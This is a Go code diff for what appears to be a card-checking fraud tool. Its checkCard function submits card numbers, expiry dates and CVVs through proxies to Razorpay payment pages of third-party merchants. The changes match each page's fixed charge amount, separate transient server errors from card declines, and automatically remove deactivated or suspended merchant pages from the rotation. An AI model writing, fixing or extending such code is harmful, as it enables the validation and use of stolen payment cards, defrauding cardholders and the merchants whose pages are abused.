@@ -1915,13 +1915,20 @@ func isCVVKeyword(msg string, reason string) bool {
 }
 
 func isRazorpayServerError(s string) bool {
-	// Only TRUE infra/network errors — HTTP-level issues, NOT Razorpay decline reasons
-	// NOTE: payment_risk_check_failed = bank DECLINED as fraud → NOT a server error
+	// TRUE infra/transient errors — should be retried, NOT treated as card declined.
+	// NOTE: payment_risk_check_failed = bank DECLINED as fraud → NOT a server error.
 	serverErrors := []string{
 		"service unavailable",
 		"bad gateway",
 		"temporarily unavailable",
 		"502", "503", "504",
+		// Razorpay 500 internal — "The server encountered an error. The incident has been reported"
+		"server encountered an error",
+		"incident has been reported",
+		// Merchant account rate-limited — temporary, not a card issue
+		// "There is a temporary block placed on the account"
+		"temporary block placed",
+		"new payment operations are put on hold",
 	}
 	for _, e := range serverErrors {
 		if strings.Contains(s, e) {
@@ -2149,9 +2156,73 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		resolvedCurrency = siteCurrency
 	}
 
-	forceAmount := toSmallestUnit(amountINR, currency)
-	if forceAmount < 1 {
-		forceAmount = 100
+	// ── Resolve the line-item amount ─────────────────────────────────────────
+	//
+	// If the payment page item has a FIXED amount (item.amount != null and != 0),
+	// we MUST use that exact amount. Sending a different value causes:
+	//   "Order: amount should be equal to payment page item amount"
+	//
+	// Only use the caller-supplied amountINR for FLEXIBLE pages (item.amount == null/0).
+	var fixedItemAmount int64 // in smallest currency unit (paise for INR)
+	var itemAmountSource string
+
+	// Try to read fixed amount from payment_link.payment_page_items[0]
+	for _, plKey := range []string{"payment_link", "payment_page"} {
+		if plObj2, ok := initData[plKey].(map[string]interface{}); ok {
+			if items, ok2 := plObj2["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
+				if item0, ok3 := items[0].(map[string]interface{}); ok3 {
+					// item.amount is in paise (smallest unit) when non-null
+					if itemAmt := getFloatFromMap(item0, "amount"); itemAmt > 0 {
+						fixedItemAmount = int64(itemAmt)
+						itemAmountSource = "item.amount"
+					} else if innerItem, ok4 := item0["item"].(map[string]interface{}); ok4 {
+						if innerAmt := getFloatFromMap(innerItem, "amount"); innerAmt > 0 {
+							fixedItemAmount = int64(innerAmt)
+							itemAmountSource = "item.item.amount"
+						} else if unitAmt := getFloatFromMap(innerItem, "unit_amount"); unitAmt > 0 {
+							fixedItemAmount = int64(unitAmt)
+							itemAmountSource = "item.unit_amount"
+						}
+					}
+				}
+			}
+			if fixedItemAmount > 0 {
+				break
+			}
+		}
+	}
+	// Also try payment_link.amount directly (paise)
+	if fixedItemAmount == 0 {
+		for _, plKey := range []string{"payment_link", "payment_page"} {
+			if plObj2, ok := initData[plKey].(map[string]interface{}); ok {
+				if plAmt := getFloatFromMap(plObj2, "amount"); plAmt > 0 {
+					fixedItemAmount = int64(plAmt)
+					itemAmountSource = plKey + ".amount"
+					break
+				}
+			}
+		}
+	}
+
+	var forceAmount int64
+	if fixedItemAmount > 0 {
+		// Use the site's fixed price
+		forceAmount = fixedItemAmount
+		// Update resolvedAmount to reflect the actual amount being charged
+		zeroDecCur := map[string]bool{"JPY": true, "KRW": true, "VND": true}
+		if zeroDecCur[currency] {
+			resolvedAmount = float64(fixedItemAmount)
+		} else {
+			resolvedAmount = float64(fixedItemAmount) / 100.0
+		}
+		log.Printf("[amount] using fixed item amount: %d paise (%.2f %s) source=%s", fixedItemAmount, resolvedAmount, currency, itemAmountSource)
+	} else {
+		// Flexible-amount page — use caller-supplied amount
+		forceAmount = toSmallestUnit(amountINR, currency)
+		if forceAmount < 100 {
+			forceAmount = 100 // Razorpay minimum: 100 paise = ₹1
+		}
+		log.Printf("[amount] flexible page — using caller amount: %d paise (%.2f %s)", forceAmount, amountINR, currency)
 	}
 
 	// ──────────────────────────────────────────────────────────────────
@@ -2191,22 +2262,34 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		return CheckResult{Status: "error", Message: "Order response parse failed: " + truncate(err.Error(), 80), Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
 
-	// Check if Razorpay returned an error response
+	// Check if Razorpay returned an error response at order creation
 	if errCode, hasErr := r2Data["error_code"]; hasErr {
 		errMsg := getStringFromMap(r2Data, "message")
 		if errMsg == "" {
 			errMsg = fmt.Sprintf("%v", errCode)
 		}
+		// "payment page which is not active" → this site is dead, remove it
+		if strings.Contains(errMsg, "not active") || strings.Contains(errMsg, "deactivated") ||
+			strings.Contains(errMsg, "suspended") || strings.Contains(strings.ToLower(fmt.Sprintf("%v", errCode)), "invalid") {
+			go markSiteDead(targetURL, sitesFilePath)
+		}
 		return CheckResult{Status: "declined", Message: "Order: " + errMsg, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
-	// Also check nested error object
+	// Also check nested error object  
 	if errObj, hasErr := r2Data["error"].(map[string]interface{}); hasErr {
+		errCode2 := getStringFromMap(errObj, "code")
 		errMsg := getStringFromMap(errObj, "description")
 		if errMsg == "" {
 			errMsg = getStringFromMap(errObj, "reason")
 		}
 		if errMsg == "" {
 			errMsg = "Order creation failed"
+		}
+		// Auto-remove dead/inactive sites
+		if strings.Contains(errMsg, "not active") || strings.Contains(errMsg, "deactivated") ||
+			strings.Contains(errMsg, "suspended") || errCode2 == "BAD_REQUEST_ERROR" &&
+			(strings.Contains(errMsg, "invalid") || strings.Contains(errMsg, "not found")) {
+			go markSiteDead(targetURL, sitesFilePath)
 		}
 		return CheckResult{Status: "declined", Message: "Order: " + errMsg, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
@@ -2882,13 +2965,16 @@ func main() {
 
 		result := checkCard(cc, mm, yy, cvv, pp, targetURL, amount, currency, billingLine1, billingCity, billingState, billingPostal)
 
-		// Auto-remove dead sites from file based on result message
+		// Auto-remove permanently dead sites from rotation based on result message
 		if targetURL != "" {
 			msg := strings.ToLower(result.Message)
 			if strings.Contains(msg, "deactivated") ||
 				strings.Contains(msg, "this link is invalid") ||
 				strings.Contains(msg, "page not found") ||
-				strings.Contains(msg, "invalid_id") {
+				strings.Contains(msg, "invalid_id") ||
+				strings.Contains(msg, "not active") ||
+				strings.Contains(msg, "suspended") ||
+				strings.Contains(msg, "this account is suspended") {
 				go markSiteDead(targetURL, sitesFilePath)
 			}
 		}
